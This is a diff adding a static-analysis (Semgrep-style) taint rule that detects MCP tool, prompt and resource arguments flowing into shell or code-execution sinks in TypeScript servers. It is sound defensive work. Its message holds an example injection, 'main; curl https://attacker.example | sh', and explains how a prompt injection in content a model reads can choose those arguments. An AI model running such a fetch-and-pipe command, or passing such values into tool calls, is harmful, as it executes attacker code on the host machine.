@@ -1,0 +1,653 @@
+rules:
+  - id: mcp-tool-arg-to-shell-ts
+    # JavaScript/TypeScript twin of mcp-tool-arg-to-shell. Sources: MCP TypeScript SDK v2.3.1
+    # (@modelcontextprotocol/server: registerTool, setRequestHandler('tools/call')) and
+    # 1.32.1 (@modelcontextprotocol/sdk: registerTool, the deprecated tool() overloads,
+    # setRequestHandler(CallToolRequestSchema)), punkpeye fastmcp 4.23.5 (addTool execute),
+    # and Claude Agent SDK 0.3.308 tool() (an in-process MCP tool). The pattern-sources block
+    # and the first sanitizer are shared with mcp-tool-arg-option-injection-ts and
+    # mcp-tool-arg-to-sql-ts (build.py SHARED_BLOCKS): edit them together. The pattern-sinks and the sanitizers after the first are shared with
+    # agent-tool-arg-to-shell-ts and llm-output-to-code-execution-ts.
+    # Resource templates and prompts (since 2026-10-25): registerResource with a
+    # ResourceTemplate (the callback gets the filled-in URI and its variables), registerPrompt
+    # with argsSchema (validated before the handler runs, so the schema sanitizer covers it),
+    # the 1.32.1 resource() / prompt() overloads, setRequestHandler("resources/read" |
+    # "prompts/get") and ReadResourceRequestSchema / GetPromptRequestSchema, and punkpeye
+    # fastmcp 4.23.5 addResourceTemplate / addPrompt load(args), checked at v2.3.1 and 1.32.1.
+    languages: [typescript, javascript]
+    severity: ERROR
+    message: >-
+      An MCP tool argument, resource-template parameter, or prompt argument reaches a shell or
+      code-execution sink. The client fills every one of them, and clients let the model
+      choose them (tool arguments always, resource URIs and prompt arguments in many clients);
+      the server can't tell who did. A prompt injection in anything the model has read (a web
+      page, an issue, a file, another tool's result) can choose them for it, so a value like
+      `main; curl https://attacker.example | sh` runs as a command on the machine hosting this
+      server. Use execFile or spawn with an argument array and no `shell` option
+      (`execFile("git", ["log", "--", ref])`), constrain the schema (`z.enum([...])`,
+      `z.number()`), and never evaluate the argument as code.
+    mode: taint
+    pattern-sources:
+      # The handler's first parameter (the validated arguments object, destructured or not).
+      # `($ARGS, ...) => {...}` also matches function expressions and expression bodies.
+      # Resource templates and prompts count since 2026-10-25: the client fills a template's
+      # variables and a prompt's arguments, and clients let the model fill them.
+      - patterns:
+          - pattern-either:
+              - pattern: $SERVER.registerTool($NAME, $CONFIG, ($ARGS, ...) => {...})
+              # Deprecated v1 overloads: the handler is the last argument. tool(name, cb) and
+              # tool(name, description, cb) register zero-argument tools whose handler only
+              # gets the request context.
+              - patterns:
+                  - pattern: $SERVER.tool($NAME, $X, ..., ($ARGS, ...) => {...})
+                  - pattern-not: $SERVER.tool($NAME, "$DESC", ($ARGS, ...) => {...})
+              - pattern: '$SERVER.addTool({..., execute: ($ARGS, ...) => {...}, ...})'
+              # Prompts: registerPrompt(name, { argsSchema }, (args, ctx) => ...). Without
+              # argsSchema the handler gets only the context. The v1 prompt(name,
+              # [description,] argsSchema, cb) overloads are like tool()'s.
+              - pattern: '$SERVER.registerPrompt($NAME, {..., argsSchema: $SCHEMA, ...}, ($ARGS, ...) => {...})'
+              - patterns:
+                  - pattern: $SERVER.registerPrompt($NAME, $CONFIG, ($ARGS, ...) => {...})
+                  - pattern-not: '$SERVER.registerPrompt($NAME, {...}, ($ARGS, ...) => {...})'
+              - patterns:
+                  - pattern: $SERVER.prompt($NAME, $X, ..., ($ARGS, ...) => {...})
+                  - pattern-not: $SERVER.prompt($NAME, "$DESC", ($ARGS, ...) => {...})
+              # Resource templates: registerResource(name, new ResourceTemplate("x://{name}",
+              # ...), config, (uri, variables, ctx) => ...) and v1 resource(name, template,
+              # [metadata,] cb): the filled-in URI and its variables. A resource at a fixed
+              # URI string gets only that URI.
+              - patterns:
+                  - pattern-either:
+                      - pattern: $SERVER.registerResource($NAME, $TPL, $CONFIG, ($ARGS, ...) => {...})
+                      - pattern: $SERVER.registerResource($NAME, $TPL, $CONFIG, ($URI, $ARGS, ...) => {...})
+                      - pattern: $SERVER.resource($NAME, $TPL, ..., ($ARGS, ...) => {...})
+                      - pattern: $SERVER.resource($NAME, $TPL, ..., ($URI, $ARGS, ...) => {...})
+                  - pattern-not: $SERVER.registerResource($NAME, "$FIXED", ...)
+                  - pattern-not: $SERVER.resource($NAME, "$FIXED", ...)
+              # punkpeye fastmcp: addResourceTemplate and addPrompt take load(args, ...).
+              - pattern: '$SERVER.addResourceTemplate({..., load: ($ARGS, ...) => {...}, ...})'
+              - pattern: '$SERVER.addPrompt({..., load: ($ARGS, ...) => {...}, ...})'
+              # Low-level handlers: the request (request.params.arguments, request.params.uri).
+              - patterns:
+                  - pattern: $SERVER.setRequestHandler($KIND, ($ARGS, ...) => {...})
+                  - metavariable-regex:
+                      metavariable: $KIND
+                      regex: ^(?:[\w.]*(?:CallTool|ReadResource|GetPrompt)RequestSchema|["'](?:tools/call|resources/read|prompts/get)["'])$
+              # Claude Agent SDK: tool(name, description, schema, handler).
+              - patterns:
+                  - pattern-either:
+                      - pattern-inside: |
+                          import { $TOOL } from "@anthropic-ai/claude-agent-sdk";
+                          ...
+                      - pattern-inside: |
+                          import { $ORIG as $TOOL } from "@anthropic-ai/claude-agent-sdk";
+                          ...
+                  - pattern: $TOOL($NAME, $DESC, $SCHEMA, ($ARGS, ...) => {...}, ...)
+              # A named handler registered elsewhere in the file: registerTool, tool,
+              # registerPrompt, prompt, registerResource, or resource(..., handler), or
+              # setRequestHandler(<call-tool, read-resource, or get-prompt>, handler). Declared
+              # before its registration, it's found by a regex over the declaration (signature and
+              # balanced body) that looks ahead for the registration; NAMED must name the
+              # function. A statement region from every function to a later registration took
+              # about 15 s on a 5,000-line file (OpenGrep 1.30.2). Declared after it, by regions
+              # that start at the registration (hoisting) or at a function that contains it (a
+              # factory such as createServer() with its handlers declared below it).
+              - patterns:
+                  - pattern-either:
+                      - patterns:
+                          - pattern-regex: |-
+                              (?x)
+                              (?(DEFINE)
+                                (?<str> "(?:[^"\\\n]|\\.)*+" | '(?:[^'\\\n]|\\.)*+' | `(?:[^`\\]|\\.)*+` )
+                                (?<com> //[^\n]*+ | /\*(?:[^*]++|\*(?!/))*+\*/ )
+                                (?<br> \{ (?: [^{}"'`/]++ | (?&com) | (?&str) | (?&br) | [/"'`] )*+ \} )
+                                (?<pa> \( (?: [^()"'`/]++ | (?&com) | (?&str) | (?&pa) | [/"'`] )*+ \) )
+                                (?<ang> < (?: [^<>=]++ | =>? | (?&ang) )*+ > )
+                                (?<ty> (?: [^{}()<>=;]++ | (?&ang) | (?&pa) | => )*? )
+                                (?<arg> [^(),"'`/]++ | (?&com) | (?&str) | (?&pa) | [,"'`/] )
+                                (?<fn> (?: \bexport [ \t]++ (?:default [ \t]++)? )? (?: \basync [ \t]++ )? \bfunction\b [ \t]*+ \*? [ \t]*+ \k<NAMED> \b
+                                  \s*+ (?&ang)? \s*+ (?&pa) \s*+ (?: : (?&ty) )? (?&br) )
+                                (?<arrow> (?: \bexport [ \t]++ )? \b(?:const|let|var) [ \t]++ \k<NAMED> \b \s*+ (?: : (?&ty) )? = \s*+ (?: async\b \s*+ )?
+                                  (?&ang)? \s*+ (?&pa) \s*+ (?: : (?&ty) )? => \s*+ (?&br) [ \t]*+ ;? )
+                                (?<reg> (?:registerTool|tool|registerPrompt|prompt) \( (?&arg)*? , \s*+ \k<NAMED> \s*+ ,? \s*+ \)
+                                      | (?:registerResource|resource) \( (?: [^(),"'`/]++ | (?&com) | (?&str) | (?&pa) )++ , \s*+ (?!["'`]) (?&arg)*? , \s*+ \k<NAMED> \s*+ ,? \s*+ \)
+                                      | setRequestHandler \( \s*+ (?: [\w$.]*(?:CallTool|ReadResource|GetPrompt)RequestSchema | "(?:tools/call|resources/read|prompts/get)" | '(?:tools/call|resources/read|prompts/get)' ) \s*+ , \s*+ \k<NAMED> \s*+ ,? \s*+ \)
+                                )
+                              )
+                              (?| (?: \bexport [ \t]++ (?:default [ \t]++)? )? (?: \basync [ \t]++ )? \bfunction\b [ \t]*+ \*? [ \t]*+ (?<NAMED>[\w$]++)
+                                  \s*+ (?&ang)? \s*+ (?&pa) \s*+ (?: : (?&ty) )? (?&br)
+                                | (?: \bexport [ \t]++ )? \b(?:const|let|var) [ \t]++ (?<NAMED>[\w$]++) \s*+ (?: : (?&ty) )? = \s*+ (?: async\b \s*+ )?
+                                  (?&ang)? \s*+ (?&pa) \s*+ (?: : (?&ty) )? => \s*+ (?&br) [ \t]*+ ;? )
+                              (?= (?: [^.]++ | \.(?!(?&reg)) )*+ \.(?&reg) )
+                          - pattern-either:
+                              - pattern: function $H($ARGS, ...) {...}
+                              - pattern: const $H = ($ARGS, ...) => {...};
+                          - metavariable-comparison:
+                              comparison: str($H) == str($NAMED)
+                      - patterns:
+                          - pattern-either:
+                              - pattern-inside: "$SERVER.registerTool(..., $H);\n..."
+                              - pattern-inside: "function $F(...) {\n  ...\n  $SERVER.registerTool(..., $H);\n  ...\n}\n..."
+                              - pattern-inside: "$SERVER.tool(..., $H);\n..."
+                              - pattern-inside: "function $F(...) {\n  ...\n  $SERVER.tool(..., $H);\n  ...\n}\n..."
+                              - pattern-inside: "$SERVER.registerPrompt(..., $H);\n..."
+                              - pattern-inside: "function $F(...) {\n  ...\n  $SERVER.registerPrompt(..., $H);\n  ...\n}\n..."
+                              - pattern-inside: "$SERVER.prompt(..., $H);\n..."
+                              - pattern-inside: "function $F(...) {\n  ...\n  $SERVER.prompt(..., $H);\n  ...\n}\n..."
+                              - patterns:
+                                  - pattern-either:
+                                      - pattern-inside: "$SERVER.registerResource($NAME, $TPL, ..., $H);\n..."
+                                      - pattern-inside: "function $F(...) {\n  ...\n  $SERVER.registerResource($NAME, $TPL, ..., $H);\n  ...\n}\n..."
+                                      - pattern-inside: "$SERVER.resource($NAME, $TPL, ..., $H);\n..."
+                                      - pattern-inside: "function $F(...) {\n  ...\n  $SERVER.resource($NAME, $TPL, ..., $H);\n  ...\n}\n..."
+                                  - metavariable-regex:
+                                      metavariable: $TPL
+                                      regex: ^[^"'`]
+                              - patterns:
+                                  - pattern-either:
+                                      - pattern-inside: "$SERVER.setRequestHandler($KIND, $H);\n..."
+                                      - pattern-inside: "function $F(...) {\n  ...\n  $SERVER.setRequestHandler($KIND, $H);\n  ...\n}\n..."
+                                  - metavariable-regex:
+                                      metavariable: $KIND
+                                      regex: ^(?:[\w.]*(?:CallTool|ReadResource|GetPrompt)RequestSchema|["'](?:tools/call|resources/read|prompts/get)["'])$
+                          - pattern-either:
+                              - pattern: function $H($ARGS, ...) {...}
+                              - pattern: const $H = ($ARGS, ...) => {...};
+              # The second parameter of a named resource-template handler: its variables.
+              - patterns:
+                  - pattern-either:
+                      - patterns:
+                          - pattern-regex: |-
+                              (?x)
+                              (?(DEFINE)
+                                (?<str> "(?:[^"\\\n]|\\.)*+" | '(?:[^'\\\n]|\\.)*+' | `(?:[^`\\]|\\.)*+` )
+                                (?<com> //[^\n]*+ | /\*(?:[^*]++|\*(?!/))*+\*/ )
+                                (?<br> \{ (?: [^{}"'`/]++ | (?&com) | (?&str) | (?&br) | [/"'`] )*+ \} )
+                                (?<pa> \( (?: [^()"'`/]++ | (?&com) | (?&str) | (?&pa) | [/"'`] )*+ \) )
+                                (?<ang> < (?: [^<>=]++ | =>? | (?&ang) )*+ > )
+                                (?<ty> (?: [^{}()<>=;]++ | (?&ang) | (?&pa) | => )*? )
+                                (?<arg> [^(),"'`/]++ | (?&com) | (?&str) | (?&pa) | [,"'`/] )
+                                (?<fn> (?: \bexport [ \t]++ (?:default [ \t]++)? )? (?: \basync [ \t]++ )? \bfunction\b [ \t]*+ \*? [ \t]*+ \k<NAMED> \b
+                                  \s*+ (?&ang)? \s*+ (?&pa) \s*+ (?: : (?&ty) )? (?&br) )
+                                (?<arrow> (?: \bexport [ \t]++ )? \b(?:const|let|var) [ \t]++ \k<NAMED> \b \s*+ (?: : (?&ty) )? = \s*+ (?: async\b \s*+ )?
+                                  (?&ang)? \s*+ (?&pa) \s*+ (?: : (?&ty) )? => \s*+ (?&br) [ \t]*+ ;? )
+                                (?<reg> (?:registerResource|resource) \( (?: [^(),"'`/]++ | (?&com) | (?&str) | (?&pa) )++ , \s*+ (?!["'`]) (?&arg)*? , \s*+ \k<NAMED> \s*+ ,? \s*+ \)
+                                )
+                              )
+                              (?| (?: \bexport [ \t]++ (?:default [ \t]++)? )? (?: \basync [ \t]++ )? \bfunction\b [ \t]*+ \*? [ \t]*+ (?<NAMED>[\w$]++)
+                                  \s*+ (?&ang)? \s*+ (?&pa) \s*+ (?: : (?&ty) )? (?&br)
+                                | (?: \bexport [ \t]++ )? \b(?:const|let|var) [ \t]++ (?<NAMED>[\w$]++) \s*+ (?: : (?&ty) )? = \s*+ (?: async\b \s*+ )?
+                                  (?&ang)? \s*+ (?&pa) \s*+ (?: : (?&ty) )? => \s*+ (?&br) [ \t]*+ ;? )
+                              (?= (?: [^.]++ | \.(?!(?&reg)) )*+ \.(?&reg) )
+                          - pattern-either:
+                              - pattern: function $H($URI, $ARGS, ...) {...}
+                              - pattern: const $H = ($URI, $ARGS, ...) => {...};
+                          - metavariable-comparison:
+                              comparison: str($H) == str($NAMED)
+                      - patterns:
+                          - pattern-either:
+                              - patterns:
+                                  - pattern-either:
+                                      - pattern-inside: "$SERVER.registerResource($NAME, $TPL, ..., $H);\n..."
+                                      - pattern-inside: "function $F(...) {\n  ...\n  $SERVER.registerResource($NAME, $TPL, ..., $H);\n  ...\n}\n..."
+                                      - pattern-inside: "$SERVER.resource($NAME, $TPL, ..., $H);\n..."
+                                      - pattern-inside: "function $F(...) {\n  ...\n  $SERVER.resource($NAME, $TPL, ..., $H);\n  ...\n}\n..."
+                                  - metavariable-regex:
+                                      metavariable: $TPL
+                                      regex: ^[^"'`]
+                          - pattern-either:
+                              - pattern: function $H($URI, $ARGS, ...) {...}
+                              - pattern: const $H = ($URI, $ARGS, ...) => {...};
+          - focus-metavariable: $ARGS
+    pattern-sanitizers:
+      # Shared with mcp-tool-arg-option-injection-ts (the first sanitizer; build.py
+      # SHARED_BLOCKS). A field whose schema only admits safe values: z.enum, z.literal,
+      # z.number, z.boolean, or a string with an anchored .regex(/^...$/). The SDK validates
+      # arguments against inputSchema before calling the handler, so uses of that field
+      # (destructured or args.field) are clean.
+      - patterns:
+          - pattern-either:
+              - pattern-inside: '$SERVER.registerTool($NAME, {..., inputSchema: {..., $KEY: $TYPE, ...}, ...}, ...)'
+              - pattern-inside: '$SERVER.registerTool($NAME, {..., inputSchema: $Z.object({..., $KEY: $TYPE, ...}), ...}, ...)'
+              - pattern-inside: '$SERVER.tool($NAME, ..., {..., $KEY: $TYPE, ...}, ($ARGS, ...) => {...})'
+              - pattern-inside: '$SERVER.addTool({..., parameters: $Z.object({..., $KEY: $TYPE, ...}), ...})'
+              # A prompt's argsSchema, validated the same way before its handler runs.
+              - pattern-inside: '$SERVER.registerPrompt($NAME, {..., argsSchema: {..., $KEY: $TYPE, ...}, ...}, ...)'
+              - pattern-inside: '$SERVER.registerPrompt($NAME, {..., argsSchema: $Z.object({..., $KEY: $TYPE, ...}), ...}, ...)'
+              - pattern-inside: '$SERVER.prompt($NAME, ..., {..., $KEY: $TYPE, ...}, ($ARGS, ...) => {...})'
+          - metavariable-pattern:
+              metavariable: $TYPE
+              pattern-either:
+                - pattern: $Z.enum(...)
+                - pattern: $Z.nativeEnum(...)
+                - pattern: $Z.literal(...)
+                - pattern: $Z.number(...)
+                - pattern: $Z.boolean(...)
+                - pattern: $Z.int(...)
+                - patterns:
+                    - pattern: $STR.regex($RE, ...)
+                    - metavariable-regex:
+                        metavariable: $RE
+                        regex: ^/\^.*\$/[a-z]*$
+          - pattern-either:
+              - pattern: $KEY
+              - pattern: $OBJ.$KEY
+      # An allowlist check before use: /^...$/.test(value).
+      - by-side-effect: true
+        patterns:
+          - pattern: $RE.test($X)
+          - metavariable-regex:
+              metavariable: $RE
+              regex: ^/\^.*\$/[a-z]*$
+          - focus-metavariable: $X
+      # An allowlist membership check before use: ALLOWED.has(value), ALLOWED.includes(value).
+      - by-side-effect: true
+        patterns:
+          - pattern-either:
+              - pattern: $ALLOWED.has($X)
+              - pattern: $ALLOWED.includes($X)
+          - focus-metavariable: $X
+      - exact: true
+        pattern: Number(...)
+      - exact: true
+        pattern: parseInt(...)
+      - exact: true
+        pattern: parseFloat(...)
+      # shell-quote's quote([...]) and shell-escape's shellescape([...]).
+      - exact: true
+        pattern: quote([...])
+      - exact: true
+        pattern: $Q.quote([...])
+      - exact: true
+        pattern: shellescape([...])
+      - exact: true
+        pattern: shellEscape([...])
+      # execa's options object in the template form (cwd, env) is not part of the command.
+      - patterns:
+          - pattern-inside: '$EXECA({..., shell: $SH, ...})`...`'
+          - pattern: '{..., shell: $SH, ...}'
+    pattern-sinks:
+      # child_process exec and execSync always use a shell: the command string.
+      - patterns:
+          - pattern-either:
+              - patterns:
+                  - pattern-either:
+                      - pattern-inside: |
+                          import * as $CP from "$MOD";
+                          ...
+                      - pattern-inside: |
+                          import $CP from "$MOD";
+                          ...
+                      - pattern-inside: |
+                          $CP = require("$MOD");
+                          ...
+                  - pattern-inside: $CP.$FN($CMD, ...)
+              - patterns:
+                  - pattern-either:
+                      - pattern-inside: |
+                          import { $FN } from "$MOD";
+                          ...
+                      - pattern-inside: |
+                          const { $FN } = require("$MOD");
+                          ...
+                  - pattern-inside: $FN($CMD, ...)
+              - patterns:
+                  - pattern-either:
+                      - pattern-inside: |
+                          import { $FN as $ALIAS } from "$MOD";
+                          ...
+                      - pattern-inside: |
+                          const { $FN: $ALIAS } = require("$MOD");
+                          ...
+                  - pattern-inside: $ALIAS($CMD, ...)
+              # const run = promisify(exec) / util.promisify(cp.exec). The import and the
+              # promisify call are separate conditions: one region from the import through
+              # the promisify call is several times slower on large files.
+              - patterns:
+                  - pattern-either:
+                      - patterns:
+                          - pattern-inside: |
+                              import { $FN } from "$MOD";
+                              ...
+                          - pattern-inside: |
+                              const $RUN = $PROMISIFY($FN);
+                              ...
+                      - patterns:
+                          - pattern-either:
+                              - pattern-inside: |
+                                  import * as $CP from "$MOD";
+                                  ...
+                              - pattern-inside: |
+                                  import $CP from "$MOD";
+                                  ...
+                          - pattern-inside: |
+                              const $RUN = $PROMISIFY($CP.$FN);
+                              ...
+                  - metavariable-regex:
+                      metavariable: $PROMISIFY
+                      regex: ^(?:\w+\.)?promisify$
+                  - pattern-inside: $RUN($CMD, ...)
+          - metavariable-regex:
+              metavariable: $MOD
+              regex: ^(?:node:)?child_process$
+          - metavariable-regex:
+              metavariable: $FN
+              regex: ^(?:exec|execSync)$
+          - pattern: $CMD
+      # spawn, execFile, fork and execa with a `shell` option: the shell joins the program
+      # and its arguments into one command line, so both count.
+      - patterns:
+          - pattern-either:
+              - patterns:
+                  - pattern-inside: '$F($CMD, $ARGV, {..., shell: $SH, ...}, ...)'
+                  - pattern-not-inside: '$F($CMD, $ARGV, {..., shell: false, ...}, ...)'
+                  - pattern-either:
+                      - pattern: $CMD
+                      - pattern: $ARGV
+              - patterns:
+                  - pattern-inside: '$F($CMD, {..., shell: $SH, ...}, ...)'
+                  - pattern-not-inside: '$F($CMD, {..., shell: false, ...}, ...)'
+                  - pattern: $CMD
+          - metavariable-regex:
+              metavariable: $F
+              regex: ^(?:(?:\w+\.)?(?:spawn|spawnSync|\w*[eE]xecFile\w*)|execa|execaSync|execaCommand|execaCommandSync|crossSpawn)$
+      # execa / $ template form with a shell: execa({shell: true})`git log ${ref}`.
+      - patterns:
+          - pattern: '$EXECA({..., shell: $SH, ...})`...`'
+          - pattern-not: '$EXECA({..., shell: false, ...})`...`'
+      # Bun Shell escapes interpolations unless they are wrapped as { raw: ... }.
+      - patterns:
+          - pattern-inside: $SHELL`...`
+          - pattern: '{ raw: $RAW }'
+          - focus-metavariable: $RAW
+      # An argv that starts a shell on the next item: spawn("bash", ["-c", cmd]),
+      # execa("sh", ["-lc", cmd]), Bun.spawn(["sh", "-c", cmd]).
+      - patterns:
+          - pattern-either:
+              - pattern: '$F($SHELLBIN, [..., $FLAG, $CMD, ...], ...)'
+              - pattern: '[..., $SHELLBIN, $FLAG, $CMD, ...]'
+          - metavariable-regex:
+              metavariable: $SHELLBIN
+              regex: ^["'`](?:[\w./-]*/)?(?:(?:ba|da|z|k|fi|c|tc)?sh|cmd(?:\.exe)?|powershell(?:\.exe)?|pwsh)["'`]$
+          - metavariable-regex:
+              metavariable: $FLAG
+              regex: ^["'`](?:-[a-zA-Z]*c[a-zA-Z]*|/[cCkK]|-(?i:command))["'`]$
+          - focus-metavariable: $CMD
+      # An argv that starts an interpreter on inline code: spawn("node", ["-e", code]),
+      # execFile(process.execPath, ["--eval", code]), ["python3", "-I", "-c", code],
+      # ["deno", "eval", code]. The eval flag comes first or after one option that takes no
+      # value, so a script's own `-c` argument (`python3 tool.py -c x`) doesn't count. Each
+      # interpreter is paired with its own eval flag, so `node -c` (syntax check) doesn't.
+      - patterns:
+          - pattern-either:
+              - pattern: '$F($BIN, [$FLAG, $CODE, ...], ...)'
+              - pattern: '[..., $BIN, $FLAG, $CODE, ...]'
+              - patterns:
+                  - pattern-either:
+                      - pattern: '$F($BIN, [$OPT, $FLAG, $CODE, ...], ...)'
+                      - pattern: '[..., $BIN, $OPT, $FLAG, $CODE, ...]'
+                  - metavariable-regex:
+                      metavariable: $OPT
+                      regex: ^["'`](?:-(?![WXmr]["'`])[a-zA-Z]{1,3}|--[a-z][\w-]*(?<!require)(?<!import)(?<!loader))["'`]$
+          - metavariable-comparison:
+              comparison: >-
+                ((re.match("^(?:[a-zA-Z0-9_./-]*/)?(?:node|nodejs|bun|tsx|ts-node)(?:[.]exe)?$", str($BIN))
+                or str($BIN) == "process.execPath")
+                and re.match("^(?:-e|--eval|-p|--print|-pe)$", str($FLAG)))
+                or (re.match("^(?:[a-zA-Z0-9_./-]*/)?deno(?:[.]exe)?$", str($BIN)) and str($FLAG) == "eval")
+                or (re.match("^(?:[a-zA-Z0-9_./-]*/)?(?:python[0-9.]*|py)(?:[.]exe)?$", str($BIN)) and str($FLAG) == "-c")
+                or (re.match("^(?:[a-zA-Z0-9_./-]*/)?(?:ruby|perl)(?:[.]exe)?$", str($BIN)) and re.match("^-[eE]$", str($FLAG)))
+                or (re.match("^(?:[a-zA-Z0-9_./-]*/)?php(?:[.]exe)?$", str($BIN)) and str($FLAG) == "-r")
+          - focus-metavariable: $CODE
+      # Code written to a file and then run in the same function: writeFile(file, code) and
+      # later spawn("node", [file]), execFile(file), fork(file), exec(`python3 ${file}`),
+      # import(pathToFileURL(file).href), require(file), or new Worker(file). Only the written
+      # contents count; a file handed to a program that only reads it (git, a linter) doesn't.
+      - patterns:
+          # Each region starts at a named write call (bare, on any object such as fs or
+          # fs.promises, or Bun.write). A region from every two-argument call ($WRITE(...) then
+          # a metavariable-regex) took about 5 s on a 5,000-line file in OpenGrep 1.30.2, and a
+          # pattern-regex gate drops every finding of a taint sink.
+          - pattern-either:
+              - patterns:
+                  - pattern-either:
+                      - pattern-inside: "writeFile($PATH, $CODE, ...);\n...\n$RUN($BIN, [..., $PATH, ...], ...);"
+                      - pattern-inside: "writeFileSync($PATH, $CODE, ...);\n...\n$RUN($BIN, [..., $PATH, ...], ...);"
+                      - pattern-inside: "outputFile($PATH, $CODE, ...);\n...\n$RUN($BIN, [..., $PATH, ...], ...);"
+                      - pattern-inside: "outputFileSync($PATH, $CODE, ...);\n...\n$RUN($BIN, [..., $PATH, ...], ...);"
+                      - pattern-inside: "$FS.writeFile($PATH, $CODE, ...);\n...\n$RUN($BIN, [..., $PATH, ...], ...);"
+                      - pattern-inside: "$FS.writeFileSync($PATH, $CODE, ...);\n...\n$RUN($BIN, [..., $PATH, ...], ...);"
+                      - pattern-inside: "$FS.outputFile($PATH, $CODE, ...);\n...\n$RUN($BIN, [..., $PATH, ...], ...);"
+                      - pattern-inside: "$FS.outputFileSync($PATH, $CODE, ...);\n...\n$RUN($BIN, [..., $PATH, ...], ...);"
+                      - pattern-inside: "Bun.write($PATH, $CODE, ...);\n...\n$RUN($BIN, [..., $PATH, ...], ...);"
+                      - pattern-inside: "writeFile($PATH, $CODE, ...);\n...\n$RUN([$BIN, ..., $PATH, ...], ...);"
+                      - pattern-inside: "writeFileSync($PATH, $CODE, ...);\n...\n$RUN([$BIN, ..., $PATH, ...], ...);"
+                      - pattern-inside: "outputFile($PATH, $CODE, ...);\n...\n$RUN([$BIN, ..., $PATH, ...], ...);"
+                      - pattern-inside: "outputFileSync($PATH, $CODE, ...);\n...\n$RUN([$BIN, ..., $PATH, ...], ...);"
+                      - pattern-inside: "$FS.writeFile($PATH, $CODE, ...);\n...\n$RUN([$BIN, ..., $PATH, ...], ...);"
+                      - pattern-inside: "$FS.writeFileSync($PATH, $CODE, ...);\n...\n$RUN([$BIN, ..., $PATH, ...], ...);"
+                      - pattern-inside: "$FS.outputFile($PATH, $CODE, ...);\n...\n$RUN([$BIN, ..., $PATH, ...], ...);"
+                      - pattern-inside: "$FS.outputFileSync($PATH, $CODE, ...);\n...\n$RUN([$BIN, ..., $PATH, ...], ...);"
+                      - pattern-inside: "Bun.write($PATH, $CODE, ...);\n...\n$RUN([$BIN, ..., $PATH, ...], ...);"
+                  - metavariable-regex:
+                      metavariable: $BIN
+                      regex: ^(?:["'`](?:[\w./-]*/)?(?:node|nodejs|deno|bun|tsx|ts-node|python[\d.]*|py|ruby|perl|php|(?:ba|da|z|k|fi|c|tc)?sh|pwsh|powershell)(?:\.exe)?["'`]|process\.execPath)$
+                  - metavariable-regex:
+                      metavariable: $RUN
+                      regex: ^(?:[\w$]+\.)*(?:spawn|spawnSync|\w*[eE]xecFile\w*|execa|execaSync|crossSpawn)$
+              - patterns:
+                  - pattern-either:
+                      - pattern-inside: "writeFile($PATH, $CODE, ...);\n...\n$RUN($PATH, ...);"
+                      - pattern-inside: "writeFileSync($PATH, $CODE, ...);\n...\n$RUN($PATH, ...);"
+                      - pattern-inside: "outputFile($PATH, $CODE, ...);\n...\n$RUN($PATH, ...);"
+                      - pattern-inside: "outputFileSync($PATH, $CODE, ...);\n...\n$RUN($PATH, ...);"
+                      - pattern-inside: "$FS.writeFile($PATH, $CODE, ...);\n...\n$RUN($PATH, ...);"
+                      - pattern-inside: "$FS.writeFileSync($PATH, $CODE, ...);\n...\n$RUN($PATH, ...);"
+                      - pattern-inside: "$FS.outputFile($PATH, $CODE, ...);\n...\n$RUN($PATH, ...);"
+                      - pattern-inside: "$FS.outputFileSync($PATH, $CODE, ...);\n...\n$RUN($PATH, ...);"
+                      - pattern-inside: "Bun.write($PATH, $CODE, ...);\n...\n$RUN($PATH, ...);"
+                  - metavariable-regex:
+                      metavariable: $RUN
+                      regex: ^(?:[\w$]+\.)*(?:spawn|spawnSync|\w*[eE]xecFile\w*|fork|execa|execaSync|execaNode|crossSpawn|require)$
+              - patterns:
+                  - pattern-either:
+                      - pattern-inside: "writeFile($PATH, $CODE, ...);\n...\n$RUN($CMD, ...);"
+                      - pattern-inside: "writeFileSync($PATH, $CODE, ...);\n...\n$RUN($CMD, ...);"
+                      - pattern-inside: "outputFile($PATH, $CODE, ...);\n...\n$RUN($CMD, ...);"
+                      - pattern-inside: "outputFileSync($PATH, $CODE, ...);\n...\n$RUN($CMD, ...);"
+                      - pattern-inside: "$FS.writeFile($PATH, $CODE, ...);\n...\n$RUN($CMD, ...);"
+                      - pattern-inside: "$FS.writeFileSync($PATH, $CODE, ...);\n...\n$RUN($CMD, ...);"
+                      - pattern-inside: "$FS.outputFile($PATH, $CODE, ...);\n...\n$RUN($CMD, ...);"
+                      - pattern-inside: "$FS.outputFileSync($PATH, $CODE, ...);\n...\n$RUN($CMD, ...);"
+                      - pattern-inside: "Bun.write($PATH, $CODE, ...);\n...\n$RUN($CMD, ...);"
+                  - metavariable-regex:
+                      metavariable: $RUN
+                      regex: (?i)^(?:[\w$]+\.)*\w*(?:exec|run|shell|spawn)\w*$
+                  - metavariable-regex:
+                      metavariable: $CMD
+                      regex: ^`\s*(?:[\w./-]*/)?(?:node|nodejs|deno(?:\s+run)?|bun|tsx|ts-node|python[\d.]*|py|ruby|perl|php|(?:ba|da|z|k|fi|c|tc)?sh)\s
+                  - metavariable-pattern:
+                      metavariable: $CMD
+                      pattern: <... $PATH ...>
+              - pattern-either:
+                  - pattern-inside: "writeFile($PATH, $CODE, ...);\n...\nimport(<... $PATH ...>);"
+                  - pattern-inside: "writeFileSync($PATH, $CODE, ...);\n...\nimport(<... $PATH ...>);"
+                  - pattern-inside: "outputFile($PATH, $CODE, ...);\n...\nimport(<... $PATH ...>);"
+                  - pattern-inside: "outputFileSync($PATH, $CODE, ...);\n...\nimport(<... $PATH ...>);"
+                  - pattern-inside: "$FS.writeFile($PATH, $CODE, ...);\n...\nimport(<... $PATH ...>);"
+                  - pattern-inside: "$FS.writeFileSync($PATH, $CODE, ...);\n...\nimport(<... $PATH ...>);"
+                  - pattern-inside: "$FS.outputFile($PATH, $CODE, ...);\n...\nimport(<... $PATH ...>);"
+                  - pattern-inside: "$FS.outputFileSync($PATH, $CODE, ...);\n...\nimport(<... $PATH ...>);"
+                  - pattern-inside: "Bun.write($PATH, $CODE, ...);\n...\nimport(<... $PATH ...>);"
+              - patterns:
+                  - pattern-either:
+                      - pattern-inside: "writeFile($PATH, $CODE, ...);\n...\nnew $WORKER(<... $PATH ...>, ...);"
+                      - pattern-inside: "writeFileSync($PATH, $CODE, ...);\n...\nnew $WORKER(<... $PATH ...>, ...);"
+                      - pattern-inside: "outputFile($PATH, $CODE, ...);\n...\nnew $WORKER(<... $PATH ...>, ...);"
+                      - pattern-inside: "outputFileSync($PATH, $CODE, ...);\n...\nnew $WORKER(<... $PATH ...>, ...);"
